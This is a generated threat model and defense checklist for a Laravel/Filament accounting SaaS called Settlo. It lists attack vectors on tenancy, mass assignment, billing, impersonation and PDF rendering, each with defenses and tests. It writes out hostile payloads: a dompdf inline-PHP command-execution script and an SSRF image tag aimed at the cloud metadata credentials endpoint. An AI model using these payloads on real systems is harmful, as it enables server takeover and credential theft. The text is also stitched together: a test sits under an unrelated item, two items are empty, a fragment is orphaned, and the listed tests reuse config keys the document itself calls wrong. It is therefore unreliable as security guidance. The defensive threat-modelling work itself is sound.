# Settlo — Security Threat Model & Defense Checklist

Generated from an adversarial threat-model of the Settlo brief: 11 attack surfaces, 96 verified attack vectors (25 critical · 47 high · 23 medium · 1 low), each confirmed or refined by an independent adversarial reviewer against Laravel 13 + Filament v5 semantics.

## Trust boundaries

- **Three panels, one `web` guard.** `/app` (owners), `/firm` (accountants), `/admin` (superadmin) share one session guard. The ONLY thing separating them is `canAccessPanel()` — it must assert role AND active status, never mere authentication.
- **Owner tenancy:** every owner-panel record belongs to a `BusinessEntity`; every query, relation manager, bulk action, and file download must be scoped to the current tenant or an IDOR opens.
- **Firm tenancy:** an accountant sees a client `BusinessEntity` only through a live (non-revoked) `AccountantAssignment` to their `AccountingFirm`. Grants are revocable and read-only.
- **Impersonation:** superadmin→any non-superadmin, policy-gated on the server, session-regenerated on start/stop, audit-logged both directions, banner-visible, never nested.
- **Plan gates & quotas:** server-enforced via policy/middleware — UI visibility is not a control. Quota spend must be atomic.
- **External surfaces:** Anthropic API (server-only key) and dompdf (remote + PHP disabled) are the two egress points; both are SSRF/secret-leak sensitive.

## Cross-cutting invariants (must hold everywhere)

- **Default-deny policies.** Every Eloquent model reachable from a panel has a Policy; Filament resources authorize view/create/update/delete; no `Gate::before` blanket-allow except an audited superadmin bypass.
- **Tenant scope on every query.** Owner data scoped to `business_entity_id` of the active tenant; firm data scoped through non-revoked assignments — including in relation managers, global search, exports, widgets, and queued jobs (jobs must carry the tenant id, never read `Filament::getTenant()`).
- **Mass-assignment guarding.** `role`, `status`, `plan_id`/`tier`, `owner_id`, `business_entity_id`, subscription state, quota counters, `invoice.status`, `paid_amount`, `qr_reference`, `creditor_iban`, `deductible_*`, `email_verified_at`, `onboarding_completed_at` are never in `$fillable`; set only by trusted server code.
- **Private, policy-gated storage.** Receipts live on a `private` disk; downloads go through an authenticated, tenant-checked controller (or temporary signed URL) — never a public/guessable path. Logos re-encoded to strip payloads.
- **Server-only AI key.** `ANTHROPIC_API_KEY` is read only in server code; never serialized into Inertia props, Livewire state, JS, or logs. All Claude calls are server-side, queued, quota-checked, token-capped.
- **dompdf lockdown.** `isRemoteEnabled=false`, `isPhpEnabled=false`, no user-controlled URLs in templates; all user text `{{ }}`-escaped in the PDF Blade.
- **Append-only audit log.** `audit_logs` captures impersonation start/stop, superadmin writes, accountant answers, plan/role/status changes — with actor, subject, IP, timestamp; no update/delete path exposed.
- **Immutable money & issued invoices.** All monetary math in BCMath on `DECIMAL(18,2)`; a `sent`/`paid` invoice's amounts, creditor IBAN, and QR reference are immutable; tax estimations store a rates snapshot and are never recalculated in place.
- **Atomic quota & state transitions.** Escalation-quota spend, trial→expired, plan change use DB transactions / `lockForUpdate` / conditional updates so concurrent requests can't double-spend or re-trial.
- **Rate limiting on cost/abuse endpoints.** Login, password reset, registration, invite acceptance, AI messages, PDF generation, OCR — all throttled.

## Defenses by build phase

### Phase 0 — Panels, roles, access control  (7)

- [ ] **[CRITICAL]** Owner self-escalates to superadmin / self-activates via registration or profile form over-post
  - **Attack:** The single `users` table carries `role` (owner/accountant/superadmin) and `status` (PENDING_VERIFICATION/ACTIVE/SUSPENDED). Filament forms serialize their whole state into one `$data` array sent over Livewire's `callMethod`/`updateProperty` payload, which the client fully controls. If `User` uses `$guarded = []` (or lists `role`/`status` in `$fillable`) and the /app RegisterUser page does `User::create($data)`, or the Settings 'profile' EditProfile form/action does `$record->update($data)`, an attacker injects `role: "superadmin"` and `status: "ACTIVE"` keys. Result: instant global panel takeover and bypass of PENDING_VERIFICATION.
  - **Defense:** Never `$guarded = []`. Set `protected $fillable = ['email','password','first_name','last_name','phone','preferred_language']` — omit role/status/email_verified_at. Cast `role => UserRole::class`, `status => UserStatus::class` (native enum casts reject unknown strings at hydration). In the Filament RegisterUser page override `mutateFormDataBeforeCreate()` to hard-set `role = OWNER`, `status = PENDING_VERIFICATION`. Expose only name/phone/language in the profile schema.
  - **Test:** Pest: livewire(Register::class)->fillForm(valid + ['role'=>'superadmin','status'=>'ACTIVE'])->call('register'); assertDatabaseHas(User, ['email'=>x,'role'=>'owner','status'=>'pending_verification']). Second test: livewire(EditProfile)->fillForm(['role'=>'superadmin'])->call('save'); assert $user->fresh()->role === UserRole::Owner.
- [ ] **[CRITICAL]** Owner/accountant reaches /admin or /firm because canAccessPanel isn't role-scoped
  - **Attack:** A Solo owner logs into /app (session on the shared `web` guard). Because all three panels use the same guard, the owner's session cookie is already valid platform-wide; the ONLY gate is FilamentUser::canAccessPanel(). If that method is missing (Filament v5 allows any authenticated user in `local`) or returns a blanket `$this->status==='active'`, the owner just navigates to /admin or /firm and gets the superadmin/firm UI — user management, plan CRUD, every tenant's books.
  - **Defense:** Implement FilamentUser::canAccessPanel(Panel $panel) on User matching $panel->getId() to role: return match($panel->getId()){ 'admin'=>$this->role===UserRole::Superadmin, 'firm'=>$this->role===UserRole::Accountant, 'app'=>$this->role===UserRole::Owner, default=>false } — plus the impersonation carve-out (see impersonation vector). Do NOT rely on the local-env default. Give each panel a distinct path AND assert role, never just authentication.
  - **Test:** it('denies an owner access to admin and firm panels'): actingAs(User::factory()->owner()->create()); get('/admin')->assertForbidden(); get('/firm')->assertForbidden(); get('/app')->assertSuccessful(). Repeat matrix for accountant and superadmin covering all 9 role×panel cells.
- [ ] **[CRITICAL]** Tenant URL segment lets owner A impersonate owner B's entity (missing/permissive canAccessTenant)
  - **Attack:** Filament tenancy routes are /app/{tenant}/invoices etc. Owner A logs in, notes their entity slug/UUID in the URL, then swaps it for owner B's BusinessEntity id/slug (UUIDs leak via QR references, invoice numbers, or are brute-forced if slugs are sequential). If User::canAccessTenant() is not implemented, returns true, or only checks role==owner, Filament serves B's entire panel — every invoice, expense, tax estimation, bank IBAN, AI conversation for B. getTenants() only controls the switcher menu; it does NOT gate direct URL access.
  - **Defense:** Implement Filament\Models\Contracts\HasTenants on User: canAccessTenant(Model $tenant): bool => $tenant instanceof BusinessEntity && $this->ownedEntities()->whereKey($tenant)->whereNull('deleted_at')->exists(); getTenants() returns only owned (non-soft-deleted) entities. Use UUIDs (already schema default) and non-guessable route keys (getRouteKeyName), never sequential slugs. Add a viewTenant/canAccessPanel guard as defense-in-depth.
  - **Test:** it('denies accessing another owner entity via tenant url', ...): create ownerA+entityA, ownerB+entityB; actingAs(ownerA); get(route panel path for entityB invoices) → assertForbidden(); and expect(ownerA->canAccessTenant(entityB))->toBeFalse().
- [ ] **[HIGH]** No rate limiting on login/reset + weak seeded prod credentials
  - **Attack:** Registration is public and the seed ships anna@test.ch / 'password' and admin@settlo.ch. If the seeder runs in a shared/staging/prod-ish environment, those are instant takeovers (admin → global data). Separately, if a custom login/reset page drops Filament's default throttle, an attacker credential-stuffs the /admin login (superadmin has no tenant scope to limit blast radius) or sprays the password-reset endpoint to fish valid emails at speed.
  - **Defense:** Keep Filament v5's built-in login rate limiter (do not override loginRateLimit to 0); add RateLimiter::for('password-reset') and a throttle middleware on the reset request route (e.g. 5/min per IP+email). Gate demo seeders behind app()->environment(['local','testing']) and force a random password + forced-change for any admin seeded elsewhere. Enforce Password::defaults()->min(12)->uncompromised() app-wide instead of the spec's min-8.
  - **Test:** it('throttles repeated failed logins'): loop 6 wrong-password livewire(Login)->call('authenticate'); 6th ->assertHasFormErrors with the rate-limit key / assertThrows ThrottleRequestsException. arch test: assert DemoSeeder aborts when app()->environment() not local/testing.
- [ ] **[HIGH]** Suspended or unverified user keeps full access until logout
  - **Attack:** Superadmin sets a user's status to SUSPENDED (default new users are PENDING_VERIFICATION). If canAccessPanel checks only role, the suspended/unverified user's existing session keeps working every request. An attacker who self-registers (registration is open for owners) with status PENDING_VERIFICATION gets an immediately usable /app session and can create invoices/expenses before verifying the email — and a suspended fraud account is never actually locked out.
  - **Defense:** In canAccessPanel also require $this->status === UserStatus::Active AND (for /app) $this->hasVerifiedEmail(). Implement MustVerifyEmail on User and call ->requiresEmailVerification() on the app panel so unverified users are parked on the verification screen. Filament re-evaluates canAccessPanel per request, so a status flip locks the live session on the next navigation.
  - **Test:** it('locks out suspended and unverified users'): $u=User::factory()->owner()->suspended()->create(); actingAs($u); get('/app')->assertForbidden(); $u->update(['status'=>Active,'email_verified_at'=>null]); get('/app')->assertRedirect(route('filament.app.auth.email-verification.prompt')).
- [ ] **[MEDIUM]** Session not regenerated on login + long-lived remember-me on privileged panels
  - **Attack:** If a custom or overridden login flow authenticates without session()->regenerate(), an attacker who pre-seeds a victim's session id (fixation via a set cookie) inherits the authenticated session post-login. Compounding it: enabling Filament's 'remember me' on /admin and /firm mints a long-lived remember_token cookie for the highest-privilege accounts — theft of that cookie is a persistent superadmin/firm takeover that survives password changes if the token isn't rotated.
  - **Defense:** Ensure login regenerates the session id (Laravel's default Login does; verify any override keeps session()->regenerate()). Disable remember-me on /admin and /firm (omit ->rememberMe() / configure the login form without the toggle), keep it only for /app. Ensure password reset/change rehashes so remember_token is invalidated (Laravel rotates it on password change), forcing re-auth of stolen cookies.
  - **Test:** it('regenerates session id on login and omits remember-me on privileged panels'): capture pre-login session id, authenticate, assert Auth::id() set and session id changed. Assert the /admin and /firm Login schema contains no 'remember' checkbox (component assertion), while /app does.
- [ ] **[LOW]** Panel logins and password-reset lack hardened throttling / enable email bombing + enumeration
  - **Attack:** Three separate Filament login pages (/app, /firm, /admin). The /admin superadmin login is the highest-value target; default Filament throttling (attempts by ip+email) can be sidestepped by rotating the email field, and the password-reset request page can be scripted to send unlimited reset emails to a victim (email bombing) and to enumerate accounts if the response differs for known vs unknown emails.
  - **Defense:** Confirm (via test) Filament's per-panel login rateLimit is on and Laravel's reset throttle + generic response are in effect — don't re-implement them. Add the pieces defaults miss: an IP-only RateLimiter on the login attempt (to blunt email-rotation spray from a single IP), an additional named RateLimiter on the password-reset request keyed by IP as well as email (e.g. 3/hour each), and tighten /admin specifically with 2FA and/or an IP allowlist since it is the highest-value target.
  - **Test:** Pest: post the /admin login 6 times with wrong password varying nothing but attempts, assert the 6th is rate-limited (assertNotified throttle). Second: request password reset 4 times for the same email within the window → 4th throttled; assert response for unknown vs known email is byte-identical.

### Phase 1 — Data model, models, mass-assignment  (3)

- [ ] **[HIGH]** Cross-tenant data injection by over-posting business_entity_id / owner_id
  - **Attack:** Owners are scoped by tenant = BusinessEntity; every Invoice/Expense/Client carries `business_entity_id`. If that FK is a form field or in `$fillable` and the resource relies on it from `$data`, Owner A crafts a CreateInvoice/CreateExpense Livewire payload with `business_entity_id` = Owner B's entity UUID, writing a record into B's tenant (and readable in B's books). Likewise BusinessEntity with `owner_id` = another user's id assigns ownership away. This is over-posting used for tenant hopping, not just IDOR.
  - **Defense:** Use Filament tenancy (`->tenant(BusinessEntity::class)`, `isScopedToTenant()`) so the FK is auto-set from `Filament::getTenant()` and every query is tenant-scoped; do NOT place business_entity_id in the form schema. Belt-and-braces: `mutateFormDataBeforeCreate()` overwrites `$data['business_entity_id'] = Filament::getTenant()->id`. Set BusinessEntity `owner_id = auth()->id()` in mutate hook, keep it out of the form. Model policies assert the record's business_entity_id ∈ the user's owned/assigned entities.
  - **Test:** Pest: actingAs($ownerA); livewire(CreateInvoice, ['tenant'=>$entityA])->fillForm(valid + ['business_entity_id'=>$entityB->id])->call('create'); assert created invoice->business_entity_id === $entityA->id. Cross-check: actingAs($ownerB); livewire(ListInvoices,['tenant'=>$entityB])->assertCanNotSeeTableRecords([$invoice]).
- [ ] **[HIGH]** Overriding getEloquentQuery() or a mislabelled ownership relationship silently disables tenant scoping
  - **Attack:** Filament auto-scoping breaks in two concrete ways: (1) a resource overrides getEloquentQuery() as Model::query()->with(...) without calling parent::getEloquentQuery(), dropping the tenant scope so the table lists all tenants' rows; (2) the tenant ownership relationship name is wrong — the FK is business_entity_id so the relationship must be businessEntity, but if a resource/panel is configured with the default guess (e.g. 'tenant' or 'owner') isScopedToTenant can no-op or throw-then-be-bypassed, listing every BankAccount IBAN / Expense across tenants.
  - **Defense:** Set tenancy explicitly: panel ->tenant(BusinessEntity::class, ownershipRelationship: 'businessEntity') or per-resource protected static ?string $tenantOwnershipRelationshipName = 'businessEntity'; keep isScopedToTenant() true. When overriding getEloquentQuery(), always return parent::getEloquentQuery()->... Add default-deny model Policies as a second layer and a smoke/feature test per resource asserting a second tenant's rows are invisible.
  - **Test:** it('bank accounts list is tenant scoped', ...): entityA bankAccount, entityB bankAccount; actingAs entityA owner tenant=A; livewire(ListBankAccounts)->assertCanSeeTableRecords([$a])->assertCanNotSeeTableRecords([$b]); repeat for clients/expenses via dataset.
- [ ] **[HIGH]** Sensitive FADP fields stored plaintext and PII/API key leak into logs via Anthropic + OCR
  - **Attack:** Swiss-sensitive PII — IBAN/QR-IBAN, phone, UID/MWST number, and the tax_profiles fields (residence permit incl. B-permit, marital status, birth year, employment income) — is stored plaintext, so any DB read, backup leak, or SQL-injection elsewhere exposes it (FADP/revDSG breach). Separately, the server-side Anthropic Http call embeds the user's canton/revenue/VAT context and the OCR raw JSON (ocrRawData) into requests; if the Http client or the exception handler logs request/response bodies, PII and the ANTHROPIC_API_KEY header land in laravel.log.
  - **Defense:** Add 'encrypted' casts to the sensitive attributes (accept they become non-indexable/searchable — decrypt in-app for QR-bill rendering). Keep the API key only in config('services.anthropic.key') and never log the outgoing request body/headers (no Http::dump, redact via a logging middleware). Add sensitive fields to a redaction list in the exception handler's context and scrub ocrRawData before any log. Ensure soft-deletes + a data-export/erasure path exist for FADP subject requests.
  - **Test:** Pest: set $profile->residencePermit / $entity->iban, assert the model accessor returns plaintext but DB::table()->value() returns ciphertext (!= plaintext). Second: Http::fake AI call, trigger an exception, assert Log fake contains no IBAN and no api-key string.

### Phase 2 — Billing, plan gating, quotas  (5)

- [ ] **[CRITICAL]** Client forges payment success to flip subscription to ACTIVE without a real charge
  - **Attack:** The dummy gateway returns instant success. If plan activation trusts a request-supplied outcome — e.g. a /billing/confirm route or Livewire action that reads payment_status/paid=true from the client and sets status=ACTIVE + writes a subscription_payments row — the attacker POSTs paid=true (or replays the success callback) to mark themselves ACTIVE, escape the trial lock, and even fabricate a paid ledger the superadmin MRR dashboard trusts. When Stripe drops in behind the same contract later, this becomes a real revenue bypass.
  - **Defense:** Payment outcome must come ONLY from a server-side PaymentGateway::charge(Subscription,$amount) call inside BillingService; never read success/paid/amount from the request. The confirm/activate transition happens inside the service after charge() returns success — the client sends only the chosen plan code. Write subscription_payments strictly from the gateway result (server-computed amount from plans.price, not client). Guard the route with auth + policy; if a webhook-style callback is added, require a signed URL / verified signature. Amount is derived from the Plan, never trusted from input.
  - **Test:** it('ignores client-supplied payment outcome'): actingAs owner on expired sub; livewire(BillingPage::class)->fillForm(['plan'=>'pro'])->set('data.paid',true)->set('data.amount',0)->call('pay'); assert the DummyGateway was invoked server-side (fake/spy) and subscription_payments.amount === plan price (49.00), not 0. it('cannot activate without gateway success'): bind a failing gateway; call pay; assertDatabaseHas('subscriptions',['status'=>'expired']).
- [ ] **[CRITICAL]** Owner self-upgrades tier / clears quota via mass assignment on subscription fields
  - **Attack:** In the /app Settings > Billing plan-switch form (or ANY Livewire/Filament form whose model is the owner's Subscription), the attacker crafts the Livewire request to include extra keys. If the billing action does $subscription->update($data) or the model has $fillable including sensitive columns, the owner POSTs tier=CONFIDENCE, status=ACTIVE, human_answers_quota=999, human_answers_used=0, trial_ends_at=2099-01-01, quota_reset_at=2099-01-01 — jumping to the top tier with unlimited escalations, an eternal trial, and reset quota, all without touching the gateway. Filament Select for plan that writes directly to the `tier` column is the obvious injection point; disabled()/hidden() fields do NOT protect because the value is still submitted via the Livewire payload.
  - **Defense:** Set protected $guarded = ['tier','status','human_answers_quota','human_answers_used','quota_reset_at','trial_starts_at','trial_ends_at','trial_used','current_period_start','current_period_end'] on Subscription (or an explicit narrow $fillable). Never bind the plan Select to `tier`; bind it to a transient form key and route ALL plan changes through a single BillingService::changePlan(Plan $plan) that validates the target plan exists+active and sets tier/quota server-side. Add a SubscriptionPolicy::update() returning false for owners (only BillingService via gateway mutates it). Mark any Filament field that must not persist ->dehydrated(false) and recompute server-side.
  - **Test:** it('rejects owner tampering with subscription tier/quota via mass assignment'): actingAs solo owner; livewire(BillingPage::class)->fillForm(['plan'=>'solo'])->set('data.tier','CONFIDENCE')->set('data.human_answers_quota',999)->call('save'); assertDatabaseHas('subscriptions',['user_id'=>$owner->id,'tier'=>'SOLO','human_answers_quota'=>0]). Plus a model unit test: (new Subscription)->fill(['tier'=>'CONFIDENCE','human_answers_quota'=>9])->getAttributes() has neither key.
- [ ] **[CRITICAL]** Solo owner upgrades tier / resets AI quota / extends trial by over-posting Subscription fields
  - **Attack:** The billing Settings 'switch plan' flow updates the `subscriptions` row. If the Filament Action does `->action(fn (array $data) => $subscription->update($data))` and Subscription is `$guarded = []`, a Solo user injects `tier: "CONFIDENCE"`, `status: "ACTIVE"`, `human_answers_quota: 3`, `human_answers_used: 0`, `trial_ends_at: "2099-01-01"`, `current_period_end: "2099-01-01"`. This unlocks every gated PlanFeature (tax_engine, accountant_access) without payment, resets the monthly answer quota mid-cycle, and grants a perpetual trial — all defeating the gating layer.
  - **Defense:** `$fillable` on Subscription must NOT include tier/status/quota/trial/period columns — those are gateway/service-owned. Plan switch goes through a SubscriptionService/PaymentGateway that takes only a validated `plan_id` (`exists:plans,id`) and derives tier + human_answers_quota from the Plan row server-side. Quota decrement lives solely in the escalation service. Filament action schema exposes only the plan Select. Cast tier/status to enums.
  - **Test:** Pest: livewire(BillingSettings)->callAction('switchPlan', ['plan_id'=>$solo->id,'tier'=>'CONFIDENCE','human_answers_quota'=>3])->assertHasNoErrors(); assert $sub->fresh()->tier === Solo and human_answers_quota === 0. Then assert the accountant_access gate/policy still denies escalation.
- [ ] **[HIGH]** Expired/past_due user still creates invoices & expenses by invoking write actions directly
  - **Attack:** On trial expiry status becomes `expired` and PLAN.md promises a 'read-only lock + upgrade modal'. If the lock is implemented as a dashboard modal / hiding the 'New invoice' button only, the attacker whose trial expired opens /app/{tenant}/invoices/create directly, or fires the Filament create Action via Livewire, and successfully writes invoices, expenses, clients, and triggers tax recalcs — using the product indefinitely for free after the 14-day trial without ever paying the dummy gateway.
  - **Defense:** Enforce writes through model policies and Filament resource/action authorization, not HTTP-verb middleware. Each write policy (create/update/delete on Invoice, Expense, Client, TaxProfile) returns false unless $user->currentSubscription()->status->grantsAccess() — reuse the existing SubscriptionStatus::grantsAccess() (trialing|active|past_due) as the single source of truth rather than a new [trialing, active] list. Add Filament canCreate()/canEdit()/canDelete() on each resource and ->authorize() on custom write Actions returning the same check (these gate the route/action with 403 on mount, which Livewire honours). Optionally add a lightweight panel middleware that only REDIRECTS locked users to the upgrade page for full page loads — never one that branches on GET vs POST. Keep Billing/upgrade routes writable while locked.
  - **Test:** it('blocks writes when subscription expired'): owner with expired sub; livewire(CreateInvoice::class)->fillForm([...])->call('create')->assertForbidden(); assertDatabaseCount('invoices',0). it('still allows viewing'): livewire(ListInvoices::class)->assertSuccessful(). it('allows upgrade action while locked').
- [ ] **[MEDIUM]** Repeated plan switching refills the monthly escalation quota
  - **Attack:** Upgrade is immediate. If BillingService::changePlan resets human_answers_used=0 (or sets a fresh quota_reset_at) on every switch, a Confidence user spends all 3 answers, switches Pro->Confidence (or Confidence->Confidence via re-select), used resets to 0, and they get 3 more — unlimited accountant answers per month by cycling plans. Because the dummy gateway charges nothing, there is no cost to the cycling.
  - **Defense:** On plan change, update tier and human_answers_quota to the new plan but DO NOT reset human_answers_used or move quota_reset_at — carry consumption across switches within the same calendar month. Better: compute used from AiEscalation::whereBetween('created_at',[monthStart,monthEnd])->count() so quota checks are immune to any counter reset. Only the scheduled monthly reset command may zero the counter / advance quota_reset_at.
  - **Test:** it('does not refill quota on plan switch'): Confidence owner with 3 escalations this month; livewire(BillingPage::class)->fillForm(['plan'=>'pro'])->call('save')->fillForm(['plan'=>'confidence'])->call('save'); attempt escalate ->assertNotified('Monthly limit reached'); assertDatabaseHas('subscriptions',['human_answers_used'=>3]).

### Phase 3 — Invoicing & QR-bill PDF  (21)

- [ ] **[CRITICAL]** dompdf isPhpEnabled ON → RCE via <script type="text/php"> in user field
  - **Attack:** If `isPhpEnabled` is ever enabled, any unescaped user field reaching the template can carry `<script type="text/php">system($_GET['c']);</script>` (or file writes). dompdf executes inline PHP during render, giving code execution as the web/queue user from a low-privilege owner account. Even with it off by default, a future 'render richer HTML' change plus an unescaped field is a latent RCE.
  - **Defense:** Strategy (pin PHP-in-PDF off + forbid {!! !!}/HtmlString for user content in the PDF template) is sound as a latent-RCE guard. Fix the key: assert expect(config('dompdf.options.enable_php'))->toBeFalse() — barryvdh v3 uses 'enable_php', not dompdf's internal 'isPhpEnabled'; the proposed config('dompdf.options.isPhpEnabled') reads null and the test proves nothing.
  - **Test:** it('has php execution disabled in dompdf', fn () => expect(config('dompdf.options.isPhpEnabled'))->toBeFalse()); plus render an invoice whose description is `<script type="text/php">echo 1;</script>`, dump the PDF, and assert the generated PDF text does not contain evidence of executed PHP (the literal escaped string is present instead).
- [ ] **[CRITICAL]** dompdf isRemoteEnabled ON → SSRF to cloud metadata / internal services via invoice img src
  - **Attack:** A Solo owner creates an invoice and puts `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` (or `http://localhost:6379`, internal admin URLs) into a client-facing field that reaches the PDF template — invoice `notes`, a line-item `description`, `creditorName`, or `additionalInfo`. On GET /app/invoices/{id}/pdf (or firm/superadmin PDF preview) dompdf, if `isRemoteEnabled` is true, performs a server-side GET of that URL while rasterizing. On a cloud host this exfiltrates IMDS credentials into the rendered PDF or into dompdf's error/timing behaviour; against internal hosts it is a blind SSRF pivot. Fires from the server regardless of which panel/role triggered the render.
  - **Defense:** Correct threat and correct strategy (base64 data-URI logo from local validated storage, chroot confined to storage, Blade {{ }} escaping so no <img> is ever emitted from user fields). BUT the config key and its test are wrong: barryvdh/laravel-dompdf v3 publishes snake_case keys — the correct assertion is expect(config('dompdf.options.enable_remote'))->toBeFalse(), not 'isRemoteEnabled' (which reads null and makes the regression test meaningless). Also add DOMPDF_ENABLE_REMOTE=false in .env for clarity. Keep the Http::fake()->assertNothingSent() feature test.
  - **Test:** it('never fetches remote resources during PDF render', function () { expect(config('dompdf.options.isRemoteEnabled'))->toBeFalse(); }); plus a feature test: create an invoice with notes containing an http://169.254.169.254 img tag, call the PDF route, assert 200 and assert no outbound HTTP was attempted using Http::fake()->assertNothingSent() (or a bound Guzzle spy).
- [ ] **[HIGH]** Amount encoded in the QR payload differs from the invoice total shown on the PDF
  - **Attack:** The QR-bill generation is fed a separately computed amount (e.g. subtotal, or a client-submitted `total`, or a stale value) rather than the single persisted invoice.total. Because line-item totals are computed live in the Livewire repeater, a double-submit or a tampered payload can persist total=X while the QR service is passed vatAmount+subtotal recomputed differently (rounding or a swapped field). Debtor scans and pays the QR-encoded figure while reading a different number on the page — silent under/over-collection, and it corrupts grossRevenue fed to the tax engine.
  - **Defense:** Single source of truth: recompute subtotal/vat/total server-side with BCMath in an Invoice saving observer from persisted line items; never accept client-supplied total/subtotal/vatAmount (leave them out of $fillable / dehydrate false). Feed the QR generator the exact same persisted `total` column. Swiss QR requires amount to 2 decimals — round once, store, reuse. Add a saving-time invariant assertion: bcadd(subtotal, vatAmount) === total.

  - **Test:** Pest: livewire(AskSettlo::class) as a Solo owner, loop call('sendMessage') 11 times in a minute, assert the 11th is throttled (assertNotified rate-limit / Anthropic Http::fake() received exactly 10 requests). Second test: expired subscription owner → assertForbidden / Http::assertNothingSent().
- [ ] **[HIGH]** Concurrent escalation requests double-spend the monthly human-answer quota (TOCTOU)

- [ ] **[MEDIUM]** AiConversation scoped by userId leaks across a multi-entity owner's other entity

If the owner-side escalation model/action allows updating these (mass assignment or an owner-reachable action), an owner could inject accountant_answer/status=ANSWERED to fabricate accountant responses, or flip add_to_knowledge_base, or reset an escalation's status/decrement to reclaim quota. Owners can also attempt to PATCH an escalation belonging to another tenant if ownership isn't scoped.
  - **Defense:** accountant_id, accountant_answer, accountant_notes, status, answered_at, add_to_knowledge_base, sla_deadline are $guarded and writable only by the firm/superadmin escalation-answer service. AiEscalationPolicy: owners may create + view their own (tenant-scoped) but never update accountant fields; firm accountants may answer only escalations whose business_entity is in their AccountantAssignment set. Scope all owner queries by the current tenant so cross-tenant escalation ids 404.
  - **Test:** it('owner cannot answer own escalation'): pro owner; attempt update escalation with status=ANSWERED,accountant_answer='x' ->assertForbidden(); assertDatabaseMissing('ai_escalations',['id'=>$e->id,'status'=>'ANSWERED']). it('accountant cannot answer unassigned clients escalation'): firm B accountant answering firm A client ->assertForbidden().

### Phase 8 — Superadmin & impersonation  (10)

- [ ] **[CRITICAL]** Actions taken while impersonating are attributed to the victim, not the superadmin
  - **Attack:** Superadmin impersonation logs in AS the target owner (native, session-based per PLAN.md §4). If audit logging and record 'created_by/actor' resolution use auth()->id() — now the victim — every invoice edited, expense deleted or escalation answered while impersonating is recorded under the owner's identity. A malicious/compromised staffer can make destructive or fraudulent changes and the trail points at the innocent owner. Related: impersonating a superadmin (privilege retention) and session fixation if the session isn't regenerated on start/stop.
  - **Defense:** Store impersonator_id in the session on start; a single audit/creating listener records actor_id = real impersonator (read from session, not auth) plus on_behalf_of = impersonated user. Audit both start and stop. Deny impersonating role===superadmin in the action (authorize + validation). Call session()->regenerate() on both start and stop to kill fixation, and re-check the impersonator is still an active superadmin on every request via middleware.
  - **Test:** Pest: start impersonation, perform a write as the impersonated owner, assert audit_logs row has actor_id = superadmin AND on_behalf_of = owner. Second: callAction(Impersonate) targeting another superadmin → assertForbidden. Third: assert session id changes after start/stop.
- [ ] **[CRITICAL]** Impersonate action not gated to superadmin / can target a superadmin
  - **Attack:** Impersonation is native: an action stores impersonator_id in session then Auth::login($target). If the Livewire action's handler doesn't re-authorize on the server (relying on the button only being rendered for superadmins), any authenticated user who replays the Livewire request (mount + call method with a target user id) escalates to any account. Second path: a superadmin impersonates ANOTHER superadmin — the target's session now has impersonator_id pointing at a peer, and the 'cannot impersonate superadmin' rule (stated in PLAN) is only UI-deep.
  - **Defense:** Gate the action with ->authorize()/a UserPolicy::impersonate() that returns $actor->role===Superadmin && $target->role!==Superadmin && $actor->id!==$target->id, and re-check inside the action closure (server-side), not just ->visible(). Write impersonator_id only after the policy passes; audit_logs row on start. The stop action must verify session('impersonator_id') resolves to a real superadmin before restoring.
  - **Test:** it('only superadmin may impersonate non-superadmins'): livewire(ListUsers::class)->callAction(TestAction::make('impersonate')->table($targetOwner))->assertForbidden() when actor is owner/accountant; and as superadmin, callAction against another superadmin ->assertForbidden(); success path asserts session has impersonator_id and an audit_logs row exists.
- [ ] **[CRITICAL]** Low-privilege user forges the Impersonate action / start route
  - **Attack:** The Impersonate action lives on the /admin Users resource, but native impersonation is triggered by a server endpoint (a Filament Action `call`/mountTableAction Livewire request, or a helper route like POST /admin/impersonate/{user}) that ultimately runs Auth::login($target). An accountant (or owner) who inspects the Livewire component name + action payload, or guesses the route, replays the request with a chosen target user id. If the only gate is `canAccessPanel('admin')` at panel boundary and the action itself performs no per-call authorization, the ImpersonationManager::start() still calls Auth::login() → attacker becomes any owner/accountant. Filament actions are plain Livewire method calls and are NOT protected just by being defined on an admin-panel resource if the class is resolvable.
  - **Defense:** Centralize in ImpersonationManager::start(User $target) and gate it twice: (1) a UserPolicy::impersonate(User $actor, User $target) that returns `$actor->role === Role::Superadmin`, wired to the Filament Action via `->authorize('impersonate', $record)` AND `->visible(fn($record)=>auth()->user()?->can('impersonate',$record))`; (2) re-assert inside start() with Gate::authorize('impersonate',$target) before any Auth::login so a forged Livewire call to the method still 403s. Do NOT expose a standalone GET route; if a route exists make it POST behind `auth` + `can:impersonate,user` route middleware + CSRF.
  - **Test:** it('forbids non-superadmin from starting impersonation', ...): actingAs(accountant) then expect(fn()=>app(ImpersonationManager::class)->start($owner))->toThrow(AuthorizationException::class); plus livewire(ListUsers::class)->assertActionHidden(TestAction::make('impersonate')->table($owner)) as an accountant, and assert 403 when the action is force-called.
- [ ] **[CRITICAL]** Writes during impersonation attributed to the victim, bypassing audit
  - **Attack:** During impersonation auth()->id() is the target owner. The audit_logs writer (and model created_by/updated_by observers) reads actor from auth()->id(), so a superadmin sending an invoice, deleting expenses, editing the tax profile, or answering an escalation while impersonating is recorded as the OWNER doing it. There is no forensic trace that a staff member touched the account — the exact abuse impersonation must be auditable for. Combined with the render-hook banner being cosmetic, the whole session of superadmin actions is invisible.
  - **Defense:** Add an Impersonation context resolved from session (impersonator_id). The AuditLogger service records BOTH `actor_id` = real impersonator when impersonating (and `impersonated_id` = auth()->id()), or add columns impersonator_id + is_impersonated to audit_logs. Register a global scope/macro so every audit row and every created_by/updated_by observer consults ImpersonationManager::isImpersonating() and stamps the impersonator. Show the banner via a render hook on app AND firm panels (PanelsRenderHook::BODY_START) so no impersonated page is unmarked.
  - **Test:** it('audit rows during impersonation carry the impersonator'): start($owner) as superadmin, then livewire(EditInvoice)->callAction(SendAction); assert_database_has('audit_logs', ['impersonator_id'=>$superadmin->id,'impersonated_id'=>$owner->id,'action'=>'invoice.sent']). Also assert a non-impersonated owner action stores impersonator_id = null.
- [ ] **[HIGH]** Impersonating another superadmin or self to launder attribution
  - **Attack:** A superadmin calls start() with a target whose role is superadmin (or their own id). The spec says 'Cannot impersonate superadmins', but if the policy only checks the ACTOR is superadmin and never inspects the TARGET, a rogue/compromised admin account impersonates admin@settlo.ch and performs destructive global writes (change plans, edit tax config, answer escalations) that get audit-attributed to the other admin — evading accountability and defeating the impersonation privilege ceiling. Self-impersonation corrupts session bookkeeping (impersonator_id == auth id → stop is a no-op loop).
